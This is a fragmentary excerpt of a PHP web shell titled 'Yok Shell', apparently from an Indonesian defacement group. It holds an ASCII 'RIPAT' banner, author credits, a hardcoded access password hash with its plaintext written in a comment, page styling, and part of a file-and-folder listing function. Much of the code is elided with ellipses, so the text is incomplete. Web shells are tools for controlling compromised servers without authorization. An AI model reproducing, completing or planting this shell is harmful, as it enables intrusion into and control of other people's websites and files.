...
$password = "166428f98a83ed79141464154b092832"; # md5: Asys0982
...
< root@Asysss:~# w00t??? >
__________  .___  __________     _____    ___________
\______   \ |   | \______   \   /  _  \   \__    ___/
 |       _/ |   |  |     ___/  /  /_\  \    |    |   
 |    |   \ |   |  |    |     /    |    \   |    |   
 |____|_  / |___|  |____|     \____|__  /   |____|   
        \/                            \/  
...
// Los DOl
###############################################################################
// Special Thanks: Sysss | Iri bilang bos | Gasdubi
###############################################################################
-->
Kiddiesss <head>
<title>Yok Shell</title>
<meta name='author' content='Rippatt'>
<meta charset="UTF-8">
<style type='text/css'>
...
function files_and_folder() {
	...
	print "</table>";
	print "<center>Copyright &copy; ".date("Y")." - <a href='http://indoxploit.or.id/' target='_blank'>".color(1, 2, "NewKiddies")."</a></center>";
}
